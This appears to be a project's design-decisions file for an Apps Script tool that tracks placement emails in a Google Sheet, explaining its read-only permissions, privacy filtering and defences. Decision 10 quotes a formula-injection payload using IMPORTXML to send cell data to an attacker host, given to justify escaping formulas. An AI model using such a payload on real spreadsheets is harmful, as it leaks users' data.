# Decisions

Why Placement Desk is built the way it is. Each entry says what was decided,
what else was on the table, and the reason. Where a decision departs from the
original project brief, it says so.

## 1. Google Sheets + Apps Script, not a Python app

**Decided:** the tool is an Apps Script project bound to a Google Sheet. The
Sheet is the dashboard, timed triggers run the checks, and the summary goes
to the student's own address.

**Instead of:** a Python command-line tool with a local web page, SQLite and
a scheduled task.

**Why:**
- A student who has never programmed can copy a Sheet. They cannot be
  expected to install Python, create a Google Cloud OAuth client and set up
  a scheduler in 15 minutes.
- It runs on Google's servers, so checks happen with the laptop closed.
- Each copy runs inside its owner's own account. There is no shared server,
  no shared OAuth app and nothing for Google to review.

**Cost:** Apps Script cannot reach a model running on the student's own
laptop, and testing needs fakes of Google's services (see 12).

## 2. Read-only Gmail through the Gmail API, with permissions listed by hand

**Decided:** Gmail is read through the Advanced Gmail service, and
`appsscript.json` lists the permissions explicitly. The Gmail permission is
`gmail.readonly`.

**Instead of:** Apps Script's built-in `GmailApp`.

**Why:** `GmailApp` makes Google ask for full mailbox access (read, send,
delete). With `gmail.readonly` the script is *unable* to send, delete, label
or mark mail as read, whatever the code says. The promise is enforced by
Google, not by good intentions.

## 3. Access to one spreadsheet only

**Decided:** the Sheets permission is `spreadsheets.currentonly`: the script
can use the Sheet it lives in and no other file.

**Instead of:** the default `spreadsheets` permission, which covers every
spreadsheet in the account.

## 4. The summary is an email to yourself, and it is optional

**Decided:** the summary is sent with `MailApp` to the address Gmail reports
as the account's own. It is plain text, at most six lines, and is sent only
when something is new.

**Trade-off, stated plainly:** the permission this needs
(`script.send_mail`) technically allows sending to any address. The code
only ever passes the account's own address, and a test asserts the recipient.
Google lets you untick this permission when you authorise the script; the
tool then simply skips the email and everything else works.

**Departure from the brief:** the brief said "push or email". Push would need
a third-party service, so only email is offered.

## 5. Rules first; no AI model in this version

**Decided:** subjects and bodies are read with rules and patterns only.

**Departure from the brief:** the brief allowed an optional AI fallback with
a fixed, validated output format. It is not in this version.

**Why:**
- Placement-cell subjects are structured enough that rules read them well
  (see `test/fixtures/subjects.js` for the styles covered).
- An AI model reading email is a prompt-injection target and needs an API
  key stored somewhere. That is a lot of risk for the few emails rules miss.
- Emails the rules cannot fully read still appear on the dashboard with
  their subject, so nothing is lost; it is only less tidy.

If it is added later it will be off by default, bring-your-own-key, given no
tools, and its output will be checked against a fixed schema.

## 6. Private mail is excluded twice

**Decided:**
1. Every Gmail search carries exclusions for OTP, verification, password,
   security-alert and bank-style subjects.
2. Each result's headers (subject, sender) are fetched first. Anything that
   looks private is dropped, and its body is never requested.
3. A subject that is clearly for another branch or batch, or is not
   placement mail, is also dropped without its body being requested.

**Why twice:** a search exclusion is one typo away from failing silently.
The second check is tested on its own by a fake mailbox that ignores the
exclusions (`e2e: even if a search leaks, private mail is never opened`).

## 7. Strict matching on shortlists, with an honest middle state

**Decided:** a student is "on the list" only on an exact roll number, exact
email address, or exact full name (any word order). There are two further
states:
- **Check - possible match:** all the words of the name are there plus an
  extra word (a middle name), or the name matches but the same row carries a
  *different* roll number (a namesake).
- **Could not read the file:** the list is a PDF, image or old-format file.

**Why:** a wrong "you are shortlisted" makes someone travel to an interview
they were not called for; a wrong "not on the list" makes them miss one. The
tool never says "not on the list" about a file it could not read.

**Privacy:** the matcher returns only a status and how it matched. Nobody
else's name or number from a list is stored (asserted in
`e2e: nobody else from a shortlist is stored anywhere`).

## 8. One row per company and track

**Decided:** a drive notice, its reminder, its shortlist and its interview
schedule all update one row, keyed by a normalised company name plus
"placement" or "internship". A follow-up that does not say which track it
is about joins the company's most recent row.

**Why:** forty emails about twelve companies should be twelve rows.

**Known limit:** the company name is whatever comes before words like
"Recruitment drive" in the subject. Unusual subjects can give an odd name or
none; the row is then titled with the subject.

## 9. The student's columns are never written

**Decided:** on the Drives tab, "My mark" and "My notes" belong to the
student. The tool reads them and writes only the ranges between and after
them. Each row's machine state lives in two hidden columns, so the tool
finds its rows by key even after the student sorts the tab. Rows the
student adds by hand have no key and are left alone.

**Tested by:** recording every cell write in the fake Sheet and asserting
none land in those two columns.

## 10. Email text can never become a formula

**Decided:** every tool-written cell is formatted as plain text, and any
value starting with `=`, `+`, `-` or `@` gets a leading apostrophe. Links
are written as rich-text links, never as `=HYPERLINK()` formulas, and only
after the address passes an http(s) check. Dates are written as text.

**Why:** a subject line such as `=IMPORTXML("https://attacker/?"&A1, ...)`
would otherwise run inside the student's Sheet and could send its contents
elsewhere.

## 11. Attachments are read as text, with limits, and never executed

**Decided:**
- `.xlsx` and `.docx` are zip files of XML. The zip's table of contents is
  read first and anything too large, encrypted or malformed is refused
  before unpacking.
- The XML is read with plain text patterns. Formulas are not evaluated;
  only the values already stored in the file are read. Macro-enabled files
  are refused.
- PDFs, images and old `.xls`/`.doc` files are not read. They are reported
  as "could not read the file" with a to-do to open the email.

**Instead of:** converting attachments with Google Drive, which would need
Drive access and would put copies of other people's data in the student's
Drive.

## 12. Tests run the real source against fake Google services

**Decided:** Apps Script has no modules; all files share one global scope.
The tests load the same files into Node's global scope in the same way, and
the Google layer runs against fakes in `test/fakes/gas.js`.

**Why:** the code that is tested is byte-for-byte the code that is deployed,
with no export boilerplate or build step in between. There are no runtime
dependencies at all; the only development dependency is ESLint.

## 13. Pre-filled form links are built on request, not automatically

**Decided:** "Build pre-filled form links automatically" is off by default.
With it off, the tool never requests a form. The student can ask for one row
at a time from the menu.

**Why:**
- Many colleges restrict forms to signed-in accounts. Those cannot be read
  from a server at all, so the common path is the copy-ready answer list.
- Fetching every link found in email is something the student should opt
  into.

When it is on, only `docs.google.com` form pages are requested (and a
`forms.gle` short link is followed one step, to `docs.google.com` only),
anonymously, and only the "view" address. No form is ever submitted.

## 14. No built-in CGPA-to-percentage formula

**Decided:** the rule is typed into Settings (`x9.5`, `x10-7.5`, ...). With
no rule, the percentage is left for the student to fill in.

**Why:** universities use different rules and change them. Shipping a named
preset that turned out wrong would put a wrong number on someone's
application.

## 15. Dates stay as wall-clock time until the last moment

**Decided:** "7th October at 9:00 a.m." is kept as year, month, day, hour
and minute, and is turned into an instant only when comparing with "now",
using the timezone from Settings. Numeric dates are read day-first unless
Settings says otherwise. "Today" and "tomorrow" count from the day the
email was sent.

## 16. The daily sweep

**Decided:** each check looks back two days; one extra check a day looks
back 21 days. Both skip every message id already handled, so the sweep only
looks at what was missed, starting from its subject line.

## 17. Logs hold counts, nothing else

**Decided:** the Log tab records how many emails were found, added, left out
and never opened. No subject, sender, name or body is logged anywhere, and
nothing is sent to any analytics service. ESLint forbids `console` calls in
the source.

## 18. Source files are ASCII-only

**Decided:** non-ASCII characters in code are written as `\uXXXX` escapes,
and a check fails the build if invisible or direction-changing characters
appear. This guards against "Trojan Source" style tricks in a tool people
are asked to trust with their inbox.

## 19. An example mode

**Decided:** "See an example first" fills the dashboard with made-up drives
run through the real pipeline, without touching Gmail. The rows are removed
by the menu or automatically on the first real check.

**Why:** people can see what they are getting before granting any mail
access.
